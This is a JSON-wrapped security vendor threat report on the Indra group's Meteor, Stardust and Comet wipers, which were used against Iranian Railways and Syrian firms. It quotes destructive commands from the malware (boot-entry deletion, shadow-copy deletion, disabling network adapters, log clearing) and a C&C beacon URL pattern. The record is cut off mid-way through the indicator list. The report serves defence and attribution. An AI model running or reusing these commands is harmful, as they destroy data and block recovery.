{
    "id": "c5b18599-e2d1-4af1-8622-5efd649fd760",
    "created_at": "2023-01-12T15:09:56.734851Z",
    "updated_at": "2025-03-27T02:17:00.689959Z",
    "deleted_at": null,
    "sha1_hash": "33dde9ac9b313972acb935f5601ce9bec63242ae",
    "title": "2021-08-14 - Indra — Hackers Behind Recent Attacks on Iran",
    "authors": "",
    "file_creation_date": "2022-05-28T18:12:06Z",
    "file_modification_date": "2022-05-28T18:12:06Z",
    "file_size": 4817774,
    "plain_text": "# Indra — Hackers Behind Recent Attacks on Iran\n\n**[research.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iran/](https://research.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iran/)**\n\nAugust 14, 2021\n\n## Introduction\n\n\nAugust 14, 2021\n\n\nThese days, when we think of nation-state level damage, we immediately think of the nationstate level actor that must be responsible for it. While most attacks against a nation’s\nsensitive networks are indeed the work of other governments, the truth is that there is no\nmagic shield that prevents a non-state sponsored entity from creating the same kind of\nhavoc, and harming critical infrastructure in order to make a statement.\n\nIn this piece, we present an analysis of a successful politically motivated attack on Iranian\ninfrastructure that is suspected to be carried by a non-state sponsored actor. This specific\nattack happened to be directed at Iran, but it could as easily have happened in New York or\nBerlin. We’ll look at some of the technical details and expose the actor behind the attack —\nthereby linking it to several other politically motivated attacks from earlier years.\n\n## Key Findings\n\n\n-----\n\nOn July 9th and 10th, 2021 Iranian Railways and the Ministry of Roads and Urban\nDevelopment systems became the subject of targeted cyber attacks. Check Point\nResearch investigated these attacks and found multiple evidence that these attacks\nheavily rely on the attacker’s previous knowledge and reconnaissance of the targeted\nnetworks.\nThe attacks on Iran were found to be tactically and technically similar to previous\nactivity against multiple private companies in Syria which was carried at least since\n2019. We were able to tie this activity to a threat group that identify themselves as\nregime opposition group, named Indra.\nDuring these years, the attackers developed and deployed within victims’ networks at\nleast 3 different versions of the wiper dubbed Meteor, Stardust, and Comet. Judging by\nthe quality of the tools, their modus operandi, and their presence on social media, we\nfind it unlikely that Indra is operated by a nation-state actor.\nA technical analysis of the tools, as well as the TTPs used by the underlying actor, are\nthoroughly described in this article. We share with the public Yara rules and a full list of\nindicators of compromise.\n\nOn Friday, July 9th, Iran’s railway infrastructure came under cyber-attack. According to\nIranian news reports, hackers displayed messages about train delays or cancellations on\ninformation boards at stations across the country, and urged passengers to call a certain\nphone number for further information. This number apparently belongs to the office of the\ncountry’s supreme leader, Ayatollah Ali Khamenei.\n\n\n-----\n\n“Long delays due to cyber attacks. More information: 64411” message containing the\nSupreme Leader office number displayed on Iran’s railways’ stations boards. Image\npublished by the media.\nThe very next day, July 10th, websites of Iran’s Ministry of Roads and Urbanization\n[reportedly went out of service after another “cyber-disruption”. Iranian social media spread](https://ir.voanews.com/top-stories/azari-jahromi-iran-cyberwarfare)\nthe photos of a monitor of one of the hacked computers, where the attackers took\nresponsibility for both consecutive attacks.\n\n\n-----\n\n“We attacked\n\nthe computer systems of the Railway Company and the Ministry of Roads and Urban\nDevelopment”. The message left by attackers on hacked machines\n[A few days later, Iranian cybersecurity company Amnpardaz Software published a short](https://threats.amnpardaz.com/malware/trojan-win32-breakwin/)\ntechnical analysis of a piece of malware supposedly related to these attacks, dubbed\n```\nTrojan.Win32.BreakWin . Based on the information published, Check Point Research\n\n```\nTeam retrieved the files from publicly available resources and conducted a thorough\ninvestigation of them. The findings shared in this report were reviewed and evaluated by\njournalists and fellow researchers from other security vendors. During this time, SentinelOne\n[released a report based on Amnpardaz’s analysis.](https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll/)\n\nIn this article, we first analyze the artifacts left by these attacks. Based on this analysis, we\nuncover a set of similar tools previously used in other operations during 2019-2020: carried\nagainst multiple targets in Syria, they did not attract much public attention at the time. We\nthen share some insights into the tactics, techniques, and procedures (TTPs) of the\n[underlying actor, which self-identifies as “Indra” and, according to some Iranian sources, may](https://irancybernews.org/?p=1454)\nhave ties to hacktivist or cybercriminal groups.\n\n\n-----\n\n## Hunting for the files from the Iranian hack\n\nWith Amnpardaz’s threat database as our starting point, we searched for files with similar\nnames and functionality. The search led us to dozens of files, all uploaded from the same\ntwo sources located in Iran. Even though we weren’t able to find all the mentioned artifacts,\nwe recovered most of the execution flow as described in Amnpardaz’s report.\n\nThe execution flow is heavily based on multiple layers of archives and Batch scripts. When\ndetonated, they:\n\nAttempt to evade anti-virus detection\nDestroy the boot configuration data\nRun the final payloads that aim to lock and completely wipe the computers in the\nnetwork.\n\nThe execution flow of the attacks against targets in Iran\nThe execution starts with pushing a scheduled task from the AD to all the machines via\ngroup policy. The task name is `Microsoft\\Windows\\Power Efficiency`\n```\nDiagnostics\\AnalyzeAll and it mimics the AnalyzeSystem task performed by Windows\n\n```\nPower Efficiency Diagnostics report tool. The subsequent chain of .bat files and archives is\nintended to perform the following operations:\n\n\n-----\n\n**Filter the target machines:** `setup.bat first checks if the hostname of the machine is`\none of the following: `PIS-APP,` `PIS-MOB,` `WSUSPROXY` or `PIS-DB . If so, it stops`\nthe execution and deletes the folder containing the malicious script from this machine.\n\n`PIS` in the hostnames stands for Passenger Information System, which is usually\nresponsible among others for updating the platform boards with actual data, so\nattackers made sure their message to the Iranian public will be displayed properly.\n**Download the malicious files onto the machine: the same batch file downloads a**\n```\n   cab archive named env.cab from a remote address in the internal network:\n   \\\\railways.ir\\sysvol\\railways.ir\\scripts\\env.cab . The use of specific\n\n```\nhostnames and internal paths indicates the attacker had prior knowledge of the\nenvironment.\n**Extract and run additional tools:** `update.bat, which was extracted and started by`\n```\n   setup.bat, uses the password hackemall to extract the next stages: cache.bat,\n   msrun.bat and bcd.bat .\n\n```\n**Disconnect the machine from all networks: the cache.bat script disables all the**\nnetwork adapters on the machine with the following command: `powershell -Command`\n```\n   \"Get-WmiObject -class Win32_NetworkAdapter | ForEach { If\n   ($.NetEnabled) { $.Disable() } }\" > NUL\n\n```\n**Perform Anti-AV checks: the same** `cache.bat script also checks if Kaspersky`\n_Antivirus is installed on the machine and if not, it adds all the files and folders related to_\nthe attack to the Windows Defender exclusion list and proceeds with the execution.\n**Corrupt the boot:** `bcd.bat is used in order to harm the boot process. First, it tries to`\noverride the `boot file with new content and then deletes the different boot identifiers`\nusing Windows built-in BCDEdit tool: `for /F \"tokens=2\" %%j in ('%comspec% /c`\n```\n   \"bcdedit -v | findstr identifier\"') do bcdedit /delete %%j /f\n\n```\n**Remove all the traces: the same** `bcd.bat in addition to boot override also removes`\n_Security, System and Application Event Viewer logs from the system using_\n```\n   wevtutil.\n\n```\n**Unleash the main payload: The** `msrun.bat script is responsible for unleashing the`\nWiper. It moves wiper-related files to “C:\\temp” and creates a scheduled task named\n```\n   mstask to execute the wiper only once at 23:55:00.\n\n## Analysis of the main payload — The Wiper\n\n```\nThe main payload of the attack is an executable named `msapp.exe, and its purpose is to`\ntake the victim machine out of service by locking it and wiping its contents. Upon execution,\nthe malware hides this executable’s console window to decrease the suspicion of vigilant\nvictims.\n\n### Wiper configuration file\n\n\n-----\n\nThe wiper will refuse to function unless it is provided a path to an encrypted configuration file\n```\nmsconf.conf as a command-line argument. The configuration file allows some degree of\n\n```\nflexibility during the execution of the payload and gives the attacker the ability to tailor the\nattack to specific victims and systems. A helper script to decrypt the configuration file is\navailable in Appendix C.\n\nThe configuration format used supports multiple fields, which jointly hint at this binary’s role\nin the attack.\n\n### Supported Configuration Fields\n\nauto_logon_path log_file_path\n\ncleanup_scheduled_task_name log_server_ip\n\ncleanup_script_path log_server_port\n\nis_alive_loop_interval paths_to_wipe\n\nlocker_background_image_jpg_path process_termination_timeout\n\nlocker_background_image_bmp_path processes_to_kill\n\nlocker_exe_path self_scheduled_task_name\n\nlocker_installer_path state_encryption_key\n\nlocker_password_hash state_path\n\nlocker_registry_settings_files users_password\n\nlog_encryption_key wiping_stage_logger_interval\n\nNot all these fields were actually used in the configuration file of the wiper targeting the\nIranian networks, which might suggest that the tool was not created specifically for this attack\n(or otherwise, that its design fell victim to premature optimization).\n\nIf the configuration is parsed successfully, the program writes the string `\"Meteor has`\n```\nstarted.\" to an encrypted log file, suggesting that the internal name of the malware is\n\n```\n“ Meteor “. As we will see later on in this article, another name was used in previous attacks.\nThroughout the entire execution of the malware, it keeps logging its actions to this same\nencrypted log file. These detailed debug logs make it easier to analyze the malicious binary\nand understand its workflow. Appendix C contains a helper script to decrypt the log file.\n\n### Configuration steps\n\n\n-----\n\nThe malware next sets out to prevent the victim from stopping the ongoing infection. First,\nthe machine is removed from the Active Directory domain by using WinAPI or WMI. This\nmakes it harder to remotely push any remediation tools to the infected machines. Next, the\nmalware proceeds to corrupt the computer’s boot configuration: in versions of Windows prior\nto Windows 7, the malware overrides the c:\\boot. ini file; in Windows 7 and above, it deletes\nthe BCD entries. Finally, the malware changes the password of the local users. In the files\nanalyzed, all the passwords chosen by the actor have the same pattern: `Aa153![random`\n```\nsequence], for example Aa153!rHrrdOvpCj or Aa153!IRro3d2JYm .\n\n```\nWhen all the above is said and done, the user will not recover access to their machine easily.\nAt this stage the malware disables the Windows screen saver, then changes both the\ndesktop wallpaper and the lock screen images to a custom image. These are the pair of\nidentical JPEG and BMP images presenting the logo of Iran’s Railways and the message\nsimilar to the one displayed on the platform boards of different railway stations in Iran:\n\n“Long delays due to cyber attacks. More information: 64411” message on the desktop\nwallpaper set up by the malware\nSomething about this “long delays due to cyber attacks” message just tickles our fancy, and\nbetrays a somewhat surrealistic sense of humor on the attackers’ part. They could have\nwritten anything, but they chose that.\n\n\n-----\n\nWith the above done, the malware logs off all users and executes a small program — a\n“locker” — in a new thread. The path to the locker file named `mssetup.exe is retrieved`\nfrom the configuration. `mssetup.exe will prevent the user from interacting with the machine`\nby blocking inputs from the keyboard and mouse devices. Finally, before moving to its main\ncause — wiping the system — the malware creates a scheduled task that assures its own\npersistence in the system. The scheduled task will be executed every time the system starts.\n\nAs an aside, there is an extra step that didn’t take place in this specific attack; the malware is\nsupposed to terminate all processes named in a `processes_to_kill list specified in the`\nconfiguration file. As it happens, the configurations used in the attacks against the Iranian\ntargets did not contain this list, and so no processes were terminated. We will later show\nconfiguration files from previous attacks that did indeed use this feature.\n\n### Wiper functionality\n\nInternally, this part is called `\"Prefix Suffix wiper\" . As its name suggests, the malware`\ngets a list of prefixes and suffixes from the configuration file and wipes the files that are\nmatched by this rule. Another string in the malware — `\"Middle Wiper\" — was probably`\nused by this malware in the past in order to wipe the files that contain some unique\nsubstrings.\n\nThe wiping procedure itself is pretty simple. First, the malware goes over the files and\ndirectories from the `paths_to_wipe config, fills them with zero-bytes instead of their real`\ncontent, and then deletes them.\n\nAfter the wiping procedure, the malware tries to delete the shadow copies by running the\nfollowing commands: `vssadmin.exe delete shadows /all /quiet **and`\n** C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete . Finally, the malware\nenters an infinite loop where it sleeps based on the `is_alive_loop_interval value from`\nthe configuration file and writes `\"Meteor is still alive.\" to the log in every iteration.`\n\nIf all this rings familiar to you, it should; it’s all straight out from the ransomware playbook —\nexcept this isn’t ransomware, which requires delicate orchestration of public-key and privatekey cryptography to make the machine ultimately recoverable; this is Nuke-it-From-Orbitware. It’s a one-way trip.\n\n## Connecting the files to the recent attacks against Iranian targets\n\nOur analysis of the files aligns with the analysis conducted by Amnpardaz. The flow of the\nattack is almost identical; the files have similar structure, the same names and the same\nfunctionality. With that said, there are still some differences. For example, the `update.bat`\nscript that we analyzed is not used by the earlier variants, which instead execute `nti.exe`\n\n\n-----\n\n— an MBR infector based on the one used by NotPetya. Another example is a slight\ndifference between the configuration shown in the Amnpardaz report and the configuration\nthat we analyzed. The minor differences are in the `paths_to_wipe key:`\n\nWiper configuration file shared by Amnpardaz (on the left) and decrypted configuration file of\nthe analyzed sample (sha256:\n68e95a3ccde3ea22b8eb8adcf0ad53c7993b2ea5316948e31d9eadd11b5151d7)\nSome of the files we’ve found contain artifacts that tie them to the attack against Iran\nRailways. One of them is the image the attackers used when replacing the victim’s wallpaper\nand lock screen image. As we mentioned before, the text that is showed is identical to the\ntext the attackers displayed on the train stations.\n\n\n-----\n\nTrain station board (on the left) shows the same message as wallpaper installed by the\nmalware (on the right)\nOther pieces in the files we analyzed contain names and other artifacts from Iran Railways’\ninternal network, including computer names and internal Active Directory object names. For\nexample, the `envxp.bat`\n( 67920ff26a18308084679186e18dcaa5f8af997c7036ba43c2e8c69ce24b9a1a ) file\ndelivered a payload using a shared directory under the `\\\\railways.ir machine:`\n```\n@echo off\nSET dirPath=c:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Sounds\nSET cabRemotePath=\"\\\\railways.ir\\sysvol\\railways.ir\\scripts\\env.cab\"\nSET cabLocalPath=\"%dirPath%\\env.cab\"\n...\n\n```\nThis can suggest that the attackers had access to the system prior to unleashing the wiper.\nAn [article by the IRNA also mentions that experts who analyzed the attacks believe that they](https://www.irna.ir/news/84407807/%D9%85%D8%A7%D8%AC%D8%B1%D8%A7%DB%8C-%D8%AD%D9%85%D9%84%D8%A7%D8%AA-%D8%B3%D8%A7%DB%8C%D8%A8%D8%B1%DB%8C-%D8%A8%D9%87-%D9%88%D8%B2%D8%A7%D8%B1%D8%AA-%D8%B1%D8%A7%D9%87-%D9%88-%D8%B4%D9%87%D8%B1%D8%B3%D8%A7%D8%B2%DB%8C-%D9%88-%D8%B1%D8%A7%D9%87-%D8%A2%D9%87%D9%86-%DA%86%D9%87-%D8%A8%D9%88%D8%AF)\ntook place at least one month before being identified.\n\n## Attacks Against Companies in Syria\n\n### Hunting for more files\n\nEquipped with the information gathered so far, we went for a hunt to find more samples.\nSpecifically, to find whether the attack on the Iranian targets was the first time that the\nattackers utilized these tools. Our queries quickly yielded results — files that were uploaded\nto Virus Total by three different submitters located in Syria. The files seemed to belong to\nthree separated incidents and were uploaded to VT in January, February and April 2020,\nmore than a year before the recent attacks against the entities in Iran.\n\n\n-----\n\nThe main payloads\n( d71cc6337efb5cbbb400d57c8fdeb48d7af12a292fa87a55e8705d18b09f516e,\n```\n6709d332fbd5cde1d8e5b0373b6ff70c85fee73bd911ab3f1232bb5db9242dd4, and\n9b0f724459637cec5e9576c8332bca16abda6ac3fbbde6f7956bc3a97a423473 ) appear to\n\n```\nbe the early versions of the `Meteor wiper that was used against the targets in Iran. Similar`\nto `Meteor, they also contain multiple debug strings, which disclose the internal name of`\nthese versions of the wiper — `Stardust and` `Comet . Out of these two versions,` `Comet`\nis the older one, compiled back in September 2019. While we have the complete execution\nflow of the two attacks that utilized `Stardust, we only have a partial view of the one where`\n```\nComet was used. For this reason, we will focus more on the execution chain of Stardust .\n\n```\nUnlike the recent attacks where the Batch files were used during early infections stages,\nthese `Stardust executions are based on multiple VBS scripts. What’s more, these scripts`\ncontain valuable information — the identities of the attacks’ targets.\n\nThe execution flow of the attacks against the Syrian companies.\nThe execution flows of both attacks leveled at Syria in which `Stardust was deployed are`\nvery similar and thus they will be described together. The initial payload that runs on the\nvictim’s machine appears to be a VBS script `resolve.vbs that extracts a password-`\nprotected RAR archive to the working folder `C:\\\\Program Files\\\\Windows`\n```\nNT\\\\Accessories\\\\ . This RAR contains another RAR file and three other VBS files. Then,\n\n```\nthe `resolve.vbs script runs the extracted scripts in the following order:`\n\n1. The first script iterates over the installed programs and checks if Kaspersky Antivirus is\n\ninstalled. If so, it tries to uninstall it using hardcoded domain credentials.\n\n\n-----\n\n2. The second script starts by checking if Kaspersky s `avp.exe process is running, and`\n\nif so it tries to remove the Kaspersky license.\n3. The last script extracts the second-stage RAR archive and runs an executable file that\n\nthe archive contains. This stage is the earlier mentioned `Stardust variant of the`\nwiper.\n\nDuring the execution of these scripts, several requests are made to a server in order to trace\nthe different steps of the execution. These are GET requests to a URL with the following\npattern, where `C&C IP is different between the attacks.`\n```\nhttps://<C&C IP>/progress.php?hn=&dt=&st=&rs=\n\n```\nwhere:\n```\n   hn = the Host Name\n   dt = the Current Date and Time\n   st = the Current Step\n   rs = the Kaspersky AV running information\n\n### Evolution of a Wiper\n\n```\nThe wiper was the final payload used in all four incidents. The different names — `Meteor,`\n```\nStardust or Comet, depending on the version — weren’t the only difference between the\n\n```\nvariants. During the evolution of 3 generations, the attackers introduced several changes in\nthe tool, some are more significant than others. Key changes between the different variants\nof the wiper are explained below.\n```\nComet is the earliest variant we have, and it might as well be the first to be created. Unlike\nStardust and Meteor, it does reference and makes use of all the strings and features\n\n```\ninside it. The others contained the artifacts, while the code itself did not utilize them. `Comet`\nhas a Kill Switch based on values from the config file including the server IP, port, URL path,\nand a number of requests to perform before aborting. It tries to connect to the server and if it\ndoesn’t get a response, or the response status is not `200 OK it aborts. In addition, the`\noldest variant creates a user as an Administrator using `NetUserAdd and`\n```\nNetLocalGroupAddMembers APIs. Then it disables the first logon animation, as well as the\n\n```\nfirst logon Privacy Settings screen. Finally, it adds itself to the auto logon based on a path it\nhas in its configuration.\n\nUnlike Meteor, Stardust and Comet do not override the `boot. ini file during their attempts`\nto corrupt the boot configuration. This feature, only relevant for Windows versions prior to\nWindows 7, only exists in the Meteor version. The earliest version, Comet, does not contain\nthe ability to corrupt boot configurations at all.\n\n\n-----\n\n```\n[boot loader]\ntimeout=0\ndefault=multi(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS\n[operating systems]\nmulti(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS=\"Microsoft Windows XP\nProfessional\" /noexecute=optin /fastdetect\n\n```\n_The content_ `Meteor writes to` `boot. ini.`\n```\nStardust and Comet use “Lock My PC 4”, a tool that restricts unauthorized use which\n\n```\n[used to be publicly available. After running the Lock My PC program, they remove the](https://fspro.net/lock-pc/)\n“hkSm” registry value to delete the generated lock password, then delete the uninstaller of\nthe tool to make it harder to recover system functionality. This functionality is not used in\n```\nMeteor, even though it has related artifacts.\n\n```\nThe configuration files used in the attacks against the Syrian targets utilized more fields than\nthe configurations that were used against the Iranian targets. These fields include\n```\nprocess_to_kill, paths_to_wipe, log_server_ip, and log_server_port . Their\n\n```\ncontent sheds the light on the targets of these operations and indicates that the attacker had\naccess to the targeted networks prior to deploying the final attack.\n\nThe `log_server_ip and` `log_server_port configuration fields are used by the`\n```\nStardust wiper to send a Base64-encoded log file to the remote server. The request is\n\n```\nsent via HTTP `POST to the` `data.html resource on the server. The configs that we`\nobtained contain different values for the servers, disclosing two IP addresses that were used\nby the attackers.\n\n### Who are the targets?\n\nMultiple artifacts that were inspected during the analysis of these two `Stardust operations`\nin Syria point to the targeted companies — Katerji Group and its related company Arfada\n**Petroleum — both located in Syria. First, the names of these companies appear in the VBS**\nfiles as the parameters for the commands they executed to disable the Kaspersky AV.\nAnother indication is the paths listed under the `paths_to_wipe field in both configurations.`\nThese paths contain a list of user names, including the domain administrators of these two\ncompanies.\n```\n\"paths_to_wipe\": [\n    [...]\n    \"c:\\\\\\\\Users\\\\\\\\administrator.ARFADA\\\\\\\\Desktop\",\n    \"c:\\\\\\\\Users\\\\\\\\administrator.ARFADA\\\\\\\\Documents\",\n    [...]\n\"paths_to_wipe\": [\n    [...]\n    \"c:\\\\\\\\Users\\\\\\\\administrator.KATERJIGROUP\\\\\\\\Desktop\",\n    \"c:\\\\\\\\Users\\\\\\\\administrator.KATERJIGROUP\\\\\\\\Documents\",\n    [...]\n\n```\n\n-----\n\n## Meet Indra\n\nOur scrutiny revealed not only the attacks’ targets, but also the identity of the group behind\nthese operations — a group that calls itself “Indra” after the Hindu God of War. In fact, Indra\ndid not try to hide that they are responsible for these operations, and left their signature in\nmultiple places.\n\nThe image that was displayed by the attackers on the victims’ locked computers announces\n“I am Indra” and takes the responsibility for the attacks on Katerji group.\n\nWallpaper set up by the Indra actor on victims machines, taking responsibility for the attacks\nand blaming the Katerji Group for “supporting terrorists” and “trading souls”\n\n\n-----\n\nIndra takes responsibility for the attack in which it deployed “Comet”.\nIn addition, all samples of the wiper but `Meteor, contain multiple occurrences of the string`\n“INDRA”. It is used by the `Comet variant as the username of a newly created Administrator`\naccount. On `Stardust though, it serves as an inert artifact, and is not involved in`\nexecution.\n\nINDRA string\n\ninside the Stardust wiper\nWe wondered whether this Indra attack group has any online presence, and in fact, they do.\nThey operate multiple social network accounts on different platforms, including Twitter,\nFacebook, Telegram, and Youtube. Among other information, the accounts contain the\n\n\n-----\n\ndisclosure of the attacks on the aforementioned companies:\n\nIndra group Twitter account takes responsibility for the attacks on Arfada\nSurveying this social network activity, one can get an idea of the group’s political ideology\nand motive for the attack, and even hear about some of the group’s previous operations.\n\nThe title of INDRA’s [official twitter account states that they are “aiming to bring a stop to the](https://twitter.com/Indra17857623)\nhorrors of QF and its murderous proxies in the region” and they claim to be very focused on\nattacking different companies who allegedly cooperate with the Iranian regime, especially\nwith the Quds-Force and Hezbollah. Their posts are all written in English or Arabic (both\ndon’t seem to be their native language), and most talk about opposing terror or offer\ndocument leaks from the various different companies that fell victim to the group’s attacks\ndue to suspected ties to the Iranian Quads Force.\n\nIn their first message, posted September 2019, INDRA claims to have carried out a\nsuccessful attack against the company Alfadelex, demolished their network, and leaked the\n[customers’ and employees’ data One of the pictures that were posted by Indra from the](https://twitter.com/Indra17857623/status/1172856868471005184)\n\n\n-----\n\nhack against Alfadelex shows a webcam photo of a person sitting in front of a computer as\nthey were watching the image we found used by `Comet on their screen (one can only`\nimagine how they felt at that moment). Another image, displayed on Alfadelex’s website, has\nthe same background as the other images we found used in the attacks against Alfadelex,\nKaterji, and Arfada.\n\nThis background image also appears as the cover photo of Indra’s Twitter and Facebook\naccounts.\n\nA screenshot of the attack on Alfadelex posted in Indra’s Twitter account\n\n\n-----\n\nThe infected computer displays the photograph we found from the attack on Alfadelex\n\n### Previous Indra Operations\n\nSumming up the social network activity of Indra, the actors claim to be responsible for the\nfollowing attacks:\n\n**September 2019: an attack against Alfadelex Trading, a currency exchange and**\nmoney transfer services company located in Syria.\n**January 2020: an attack against Cham Wings Airlines, a Syrian-based private airline**\ncompany.\n**February 2020 and April 2020: seizure of Afrada’s and Katerji Group’s network**\ninfrastructure. Both companies are situated in Syria as well.\n**November 2020: Indra threatens to attack the Syrian Banias Oil refinery, though it is**\nnot clear whether the threat was carried out.\n\n\n-----\n\nAround November 2020, all of Indra s accounts fell silent. We weren t able to find evidence of\nany additional operations until this latest one.\n\n## Connecting Indra to the Attacks on Iranian Targets\n\nThe series of attacks on Syrian targets in 2019 and 2020 bears multiple similarities to the\ncampaigns against the Iranian networks. These are similarities in the tools, the Tactics,\nTechniques and Procedures (TTP), as well as in the highly targeted nature of the attack, and\nthey make us believe that Indra is also responsible for the recent attacks in Iran.\n\nThe attacks are all directed against Iranian-related targets, whether it is Iran Railways\nand Iran’s Ministry of Roads in 2021, or Katerji, Arfada, Alfadelex, and other Syrian\ncompanies targeted in 2020 and 2019. Indra’s tweets and posts make it clear that they\nare targeting entities that they believe have ties with Iran.\nThe multi-layered execution flow in all the attacks we analyzed — including the recent\nattacks against Iranian targets — uses script files and archive files as their mean of\ndelivery. The scripts themselves, although they are of different file types, had almost\nthe same functionality.\nExecution flow relies on previous access and recon info about the targeted network. In\ncase of Iranian intrusion, the attackers knew exactly which machines they need to\nleave unaffected in order to deliver their message publicly; furthermore, they had\naccess to the railway’s Active Directory server which they used to distribute the\nmalicious files. Another indication for the reconnaissance done by Indra is the\nscreenshot they took from Alfadelex’s Web Camera, showing the office with an infected\nPC.\nThe wiper is the final payload deployed on the computers of the victims in all the\naforementioned attacks. Meteor, Stardust, and Comet are different versions of the\nsame payload, and we do not have an indication that this tool was ever used by other\nthreat actors.\nThe actor behind the attacks we analyzed did not try to keep their attack a secret. They\nshared messages and displayed pictures announcing the attacks. In the attacks\nagainst the Iranian targets, these messages were displayed not only on affected\ncomputers but also on the platform boards.\n\nUnlike their previous operations, Indra did not publicly take responsibility for the attacks in\nIran. This might be explained by the seriousness of the new attacks, as well as their impact.\nWhile the attacks we inspected in Syria were carried against private companies, the attacks\nagainst Iran Railways and the Ministry of Roads and Urbanization targeted official Iranian\nentities. Moreover, the attacks in Syria received little media attention, whereas the attacks\nagainst the Iranian government were covered extensively all over the world and reportedly\ncaused the Iranians some amount of grief.\n\n## Conclusion\n\n\n-----\n\nBy carrying out an analysis of this latest attack against Iran, we were able to reveal its\nconvoluted execution flow as well as 2 additional variants of the final ‘wiper’ component.\nThese tools, in turn, were used previously in attacks against Syrian companies, for which the\nthreat actor Indra took responsibility officially on their social media accounts. While Indra\nchose not to take responsibility for this latest attack against Iran, the similarities above betray\nthe connection.\n\nThere are two lessons to be learned from this incident.\n\nFirst, anonymity is a one-way street. Once you sacrifice it to reap PR and obtain some sweet\nlikes on Twitter, it is not so easily recovered. You can stop broadcasting your actions to the\nentire world and you might think that you’ve gone under the radar, but The Internet\nRemembers, and given enough motivation, it will deanonymize you, even if you’re a badass\nhacktivist threat actor.\n\nSecond, that we should be more worried about attacks that are entirely possible but “clearly\naren’t going to happen” according to the calculus of prevailing common wisdom. With all the\ntrouble caused by cybercrime, hacktivism, nation-state meddling and so forth and so on, the\nextent and sophistication of attacks in general is still a fraction of its complete potential;\noftentimes, threat actors don’t do X, Y, Z even though they perfectly well could, and we come\nto rely on this truancy like it were a law of nature.\n\nCases like this, where said threat actors go ahead and do X, Y, Z, ought to raise our\ncollective level of anxiety. As we said in the opening statement, this attack happened in Iran,\nbut next month an equivalent attack could be launched by some other group targeting New\nYork, and Berlin the month after that. Nothing prevents it, except threat actors’ limited\npatience, motivation and resources, which — as we’ve clearly just seen — are sometimes\nnot so limited after all.\n\n## Appendix A – Indicators of Compromise\n\n**Samples:**\n\n\n-----\n\n```\nmd5,sha1,sha256\nExecutables:\n5e3e9ac6e280d8f7fa0e29707d32ce63, 6dc64e916faaf7cb26c7019e3d1e9c423550e2bd,\n6709d332fbd5cde1d8e5b0373b6ff70c85fee73bd911ab3f1232bb5db9242dd4\n685632a50d8c514a09882f24165741c3, 864667b969b7b31e8975700c4e9236390a250118,\nd71cc6337efb5cbbb400d57c8fdeb48d7af12a292fa87a55e8705d18b09f516e\n04633656756847a79c7a2a02d62e5522, 86e4f73c384d84b6ecd5ad9d7658c1cc575b54df,\n2aa6e42cb33ec3c132ffce425a92dfdb5e29d8ac112631aec068c8a78314d49b\nbd5acbbfc5c2c8b284ec389207af5759, c71b6cd6a46494e9132da20a6bacfe0b870a460e,\n9b0f724459637cec5e9576c8332bca16abda6ac3fbbde6f7956bc3a97a423473\nOther Artifacts:\naad0e2a996a0b1602f5716f1b9615631, acc58db9a430be2a385d046634b26c5f88b839a0,\n7ad16dab6f066ec559e11ead2d9da8755d03273b1c5d374a3f59dd421c417f5a\nf034755abb5ba85c7d24660668f8e710, b3f5cc0288dce893cb5b4716f30b535e862dd3e6,\n0f941dea21337420610164da04fa2c3c929b2685363e79e5b70818cd43b3aa13\n8420afcab941d1fdf78acd1795c7119a, b21bde15f12e30f9b8c167716da2d3d46c33f71b,\nb75a962528123df9d773baa86215d9b9c6d0b85bf8364e4e553d7b64a4a9f532\ne1cd6d256f1eb0670f3149f5beb56ee6, 296c1c077d00eeca273fdb8bd3dc79fd32ed20b4,\neb5237d56c0467b5def9a92e445e34eeed9af2fee28f3a2d2600363724d6f8b0\n8c14e57367fa096afebb94260301ed48, b4fed320516ae5f64bb1e02890e866e0533ee649,\n62a984981d14b562939294df9e479ac0d65dfc412d0449114ccb2a0bc93769b0\n877a992716d13e47a52f4cdf00e51c02, ca942726a3b262b98a5fddb1b2e4734246cdf9cf,\n2872da0355c441cedba1e5f811e99b56ea5517fe86fdebb4e579a49baf0bdee0\n5d70cc279156c425101e51bfa92e61ea, ae4bb25557eaca1ce03ec392b27d2afb712c815a,\n3099deb8c06fb8d188863f0c861de0c5bef657abdb9920ab501d9e165e495381\n73b0bca9d0dfb45492475f39ab54b735, 86194d936776050ca4d7f1236badc9df872122f6,\n571468214c11e5c76ae524b730b26b02872d8987cc67ce2d7faaabeceb1f5e52\n2be09527a2acc1906a4f77d42cae315c, 2dabc8a869dced67b9ce6308628441f826b17daf,\n5cd6e3e2c2c7313de5acc5b9a4ca4a7680b0d667951627038e5df348f61aacea\n86faa0db58b4443270c505e561b77eb5, c304aed1735814c4614f5367cb12e9f89ce00a99,\n8929380c7ea52659e0f7cacfde2e01011b9fb895db0e52cea388db901e1e668f\n3cba53cda9ace7ab1a7beeb0f401047d, 0a725efee682999a2a27a827f7abd19b85fdbf27,\n78a8134a53fa2c541dcc8fbb8a122addf0f855a86dd041bd75ff845c34e43913\n20db704469ae59c75a76cf36c84e8d9f, ec65cd56f5c79df62c01ae16e474d8d218f2e957,\n948febaab71727217303e0aabb9126f242aa51f89caa7f070a3da76c4f5699ed\n1d9ae3af3503a087a4f942cacf2a7b75, 706918a9a551e506333fc84e89189b126bff6fd1,\n74cdb71236c63343428ed61d578a0d048fa9ec46929413726542e2f7e02311ce\n6f78d83ef0471cc783e29d8051e24f67, 08727eb2ebcd8e46aff094c611e806df3dba20f9,\n5553ba3dc141cd63878a7f9f0a0e67fb7e887010c0614efd97bbc6c0be9ec2ad\n1551eaf7f1935ec3bcbde64f09c77d4c, b84a60f800bbd06e778ffc09e28abe38b3573903,\n22627df09a7d68e99f4682d9442755de38c71f53af22c80f92def91823af1466\nbab43b4e0df5b64ab0f053c813497610, 03e6a0b9afe4346ff0e5bc2c3a4ff05e6a4eb6bd,\n341e5d7fab4e6b5a16ab2c5b506d00e49b1b3aa214fb930a371637a1813382c6\n4c1636d7036a9b4bfea421b25f73691e, 40faadf37fc6bace3a304f572b1f2892e8147820,\n342fb340dc518faa5811d2b9701f83a14d409310da32e0b8c451a85200e08832\ndb07dd687b32c50a0aa51359fb8cce09, 